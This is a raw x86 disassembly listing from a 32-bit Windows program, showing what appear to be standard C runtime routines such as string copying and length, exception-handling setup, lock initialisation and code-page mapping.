  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
